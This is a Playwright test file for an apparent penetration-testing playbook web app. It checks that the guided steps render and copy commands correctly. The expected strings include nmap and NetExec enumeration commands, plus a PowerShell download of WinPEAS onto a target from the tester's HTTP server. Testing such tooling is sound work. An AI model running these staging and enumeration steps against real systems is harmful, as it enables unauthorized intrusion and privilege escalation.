import { expect, test } from '@playwright/test'
import AxeBuilder from '@axe-core/playwright'

test('HTTP download step shows both machines and fills the reachable Kali address', async ({ page }) => {
  await page.goto('./#/companions/guided')
  await page.getByRole('button', { name: /^Edit variables/ }).click()
  const dialog = page.getByRole('dialog', { name: 'Machine variables' })
  await dialog.getByRole('textbox', { name: 'My IP', exact: true }).fill('192.0.2.10')
  await dialog.getByRole('textbox', { name: 'My port', exact: true }).fill('8000')
  await dialog.getByRole('button', { name: 'Close', exact: true }).click()
  await page.getByRole('button', { name: 'Scan complete', exact: true }).click()
  await page.getByRole('button', { name: 'Domain recorded', exact: true }).click()
  await page.getByRole('button', { name: 'Download WinPEAS', exact: true }).click()
  await expect(page.getByRole('region', { name: /bash code/ })).toHaveText(
    'cd /home/kali/tools/binaries\npython3 -m http.server 8000',
  )
  await expect(page.getByRole('region', { name: /powershell code/ })).toHaveText(
    "iwr -UseBasicParsing -Uri 'http://192.0.2.10:8000/winPEASx64.exe' -OutFile '.\\winPEASx64.exe'",
  )
  await expect(page.getByRole('region', { name: /code$/ })).toHaveCount(2)
})

test('service choices reveal only selected commands and survive Back and reload for the current host', async ({
  page,
}) => {
  await page.setViewportSize({ width: 320, height: 844 })
  await page.goto('./#/companions/guided')
  await page.getByRole('button', { name: /^Edit variables/ }).click()
  let dialog = page.getByRole('dialog', { name: 'Machine variables' })
  await dialog.getByRole('textbox', { name: 'IP address', exact: true }).fill('192.0.2.20')
  await dialog.getByRole('button', { name: 'Close', exact: true }).click()
  await page.getByRole('button', { name: 'Scan complete', exact: true }).click()
  await page.getByRole('button', { name: 'Domain recorded', exact: true }).click()
  await expect(page.getByRole('region', { name: /bash code/ })).toHaveCount(0)
  await page.getByRole('checkbox', { name: 'SMB', exact: true }).check()
  await page.getByRole('checkbox', { name: 'WinRM', exact: true }).check()
  await expect(page.getByRole('region', { name: /bash code/ })).toHaveCount(2)
  await expect(page.getByRole('region', { name: /bash code/ }).first()).toContainText('nxc smb 192.0.2.20')
  await expect(page.getByRole('region', { name: /bash code/ }).last()).toContainText('nxc winrm 192.0.2.20')
  await expect(page.getByText('nxc ldap', { exact: false })).toHaveCount(0)
  await expect.poll(() => page.evaluate(() => document.documentElement.scrollWidth)).toBeLessThanOrEqual(320)
  await page.getByRole('button', { name: 'Back', exact: true }).click()
  await page.getByRole('button', { name: 'Domain recorded', exact: true }).click()
  await page.reload()
  await expect(page.getByRole('checkbox', { name: 'SMB', exact: true })).toBeChecked()
  await page.getByRole('button', { name: /^Edit variables/ }).click()
  dialog = page.getByRole('dialog', { name: 'Machine variables' })
  await dialog.getByRole('textbox', { name: 'IP address', exact: true }).fill('192.0.2.21')
  await dialog.getByRole('button', { name: 'Close', exact: true }).click()
  await expect(page.getByRole('checkbox', { name: 'SMB', exact: true })).not.toBeChecked()
  await page.getByRole('checkbox', { name: 'LDAP', exact: true }).check()
  await expect(page.getByRole('region', { name: /bash code/ })).toContainText('nxc ldap')
  await page.getByRole('button', { name: /^Edit variables/ }).click()
  dialog = page.getByRole('dialog', { name: 'Machine variables' })
  await dialog.getByRole('textbox', { name: 'IP address', exact: true }).fill('192.0.2.20')
  await dialog.getByRole('button', { name: 'Close', exact: true }).click()
  await expect(page.getByRole('checkbox', { name: 'SMB', exact: true })).toBeChecked()
  await expect(page.getByRole('checkbox', { name: 'LDAP', exact: true })).not.toBeChecked()
  await expect(page.getByRole('checkbox', { name: 'WinRM', exact: true })).toBeChecked()
  await expect(page.getByRole('checkbox', { name: 'LDAP', exact: true })).not.toBeChecked()
  await page.getByRole('button', { name: /^Edit variables/ }).click()
  dialog = page.getByRole('dialog', { name: 'Machine variables' })
  await dialog.getByRole('tab', { name: 'Box 2', exact: true }).click()
  await dialog.getByRole('button', { name: 'Make Box 2 default', exact: true }).click()
  await dialog.getByRole('button', { name: 'Close', exact: true }).click()
  await expect(page.getByRole('checkbox', { name: 'SMB', exact: true })).not.toBeChecked()
  await expect(page.getByRole('region', { name: /bash code/ })).toHaveCount(0)
  await page.getByRole('button', { name: /^Edit variables/ }).click()
  dialog = page.getByRole('dialog', { name: 'Machine variables' })
  await dialog.getByRole('tab', { name: 'Box 1', exact: true }).click()
  await dialog.getByRole('button', { name: 'Make Box 1 default', exact: true }).click()
  await dialog.getByRole('button', { name: 'Close', exact: true }).click()
  await expect(page.getByRole('checkbox', { name: 'SMB', exact: true })).toBeChecked()
  page.once('dialog', (dialog) => dialog.accept())
  await page.getByRole('button', { name: 'Restart', exact: true }).click()
  await page.getByRole('button', { name: 'Scan complete', exact: true }).click()
  await page.getByRole('button', { name: 'Domain recorded', exact: true }).click()
  await expect(page.getByRole('checkbox', { name: 'SMB', exact: true })).not.toBeChecked()
})

for (const scheme of ['light', 'dark'] as const) {
  test(`selected service cards remain accessible on a narrow screen (${scheme})`, async ({
    page,
    browserName,
  }) => {
    // Native SIGSEGV in Firefox's Axe DOM-context traversal, before rules run.
    // Layout and selection still run above in every browser. TODO: retry after browser upgrades.
    test.skip(
      browserName === 'firefox',
      'Firefox crashes during Axe service-card DOM inspection; see CONTRIBUTING.md',
    )
    await page.setViewportSize({ width: 320, height: 844 })
    await page.emulateMedia({ colorScheme: scheme })
    await page.goto('./#/companions/guided')
    await page.getByRole('button', { name: 'Scan complete', exact: true }).click()
    await page.getByRole('button', { name: 'Domain recorded', exact: true }).click()
    await page.getByRole('checkbox', { name: 'SMB', exact: true }).check()
    await page.getByRole('checkbox', { name: 'WinRM', exact: true }).check()
    await expect(page.getByRole('region', { name: /bash code/ })).toHaveCount(2)
    await expect
      .poll(() => page.evaluate(() => document.documentElement.scrollWidth))
      .toBeLessThanOrEqual(320)
    await page.evaluate(() => document.fonts.ready)
    await page.evaluate(() =>
      Promise.allSettled(document.getAnimations().map((animation) => animation.finished)),
    )
    expect((await new AxeBuilder({ page }).analyze()).violations).toEqual([])
  })
}

test('playbook steps show and copy the current target command before moving on', async ({
  page,
  browserName,
  context,
}) => {
  if (browserName === 'chromium') await context.grantPermissions(['clipboard-read', 'clipboard-write'])
  else {
    await page.addInitScript(() => {
      Object.defineProperty(navigator, 'clipboard', {
        configurable: true,
        value: {
          writeText: (text: string) => {
            document.documentElement.dataset.copied = text
            return Promise.resolve()
          },
        },
      })
    })
  }
  await page.goto('./#/companions/guided')
  await expect(page.getByRole('heading', { name: 'Run Nmap first', exact: true })).toBeVisible()
  await expect(page.getByRole('region', { name: /bash code/ })).toHaveText('nmap -sV {{RHOST}}')
  await page.getByRole('button', { name: /^Edit variables/ }).click()
  const dialog = page.getByRole('dialog', { name: 'Machine variables' })
  await dialog.getByRole('textbox', { name: 'IP address', exact: true }).fill('192.0.2.20')
  await dialog.getByRole('button', { name: 'Close', exact: true }).click()
  await expect(page.getByRole('region', { name: /bash code/ })).toHaveText('nmap -sV 192.0.2.20')
  await page.getByRole('textbox', { name: 'Findings and evidence' }).fill('Scan output saved')
  await page.getByRole('button', { name: 'Copy code', exact: true }).click()
  const copied =
    browserName === 'chromium'
      ? await page.evaluate(() => navigator.clipboard.readText())
      : await page.locator('html').getAttribute('data-copied')
  expect(copied).toBe('nmap -sV 192.0.2.20')
  await page.getByRole('button', { name: 'Scan complete', exact: true }).click()
  await expect(page.getByRole('region', { name: /bash code/ })).toHaveText('nxc smb 192.0.2.20')
  await expect(page.getByRole('list', { name: 'Answers so far' }).getByRole('button')).toHaveText(
    'Scan complete',
  )
  await page.reload()
  await expect(page.getByRole('region', { name: /bash code/ })).toHaveText('nxc smb 192.0.2.20')
  await page.getByRole('button', { name: 'Back', exact: true }).click()
  await expect(page.getByRole('region', { name: /bash code/ })).toHaveText('nmap -sV 192.0.2.20')
  await expect(page.getByRole('textbox', { name: 'Findings and evidence' })).toHaveValue('Scan output saved')
})

test('imported profile ports recommend but do not select companion services', async ({ page }) => {
  await page.goto('./#/tools/parse')
  await page.getByRole('textbox', { name: 'Scan output' }).fill(`Nmap scan report for 192.0.2.30
PORT    STATE SERVICE
445/tcp open  microsoft-ds
`)
  await page.getByRole('button', { name: 'Use in Box 1' }).click()
  await page.goto('./#/companions/guided')
  await page.getByRole('button', { name: 'Scan complete', exact: true }).click()
  await page.getByRole('button', { name: 'Domain recorded', exact: true }).click()
  await expect(page.getByText("Suggested by the current profile's scan")).toHaveCount(1)
  await expect(page.getByRole('checkbox', { name: 'SMB', exact: true })).not.toBeChecked()
  await expect(page.getByRole('checkbox', { name: 'WinRM', exact: true })).not.toBeChecked()
})
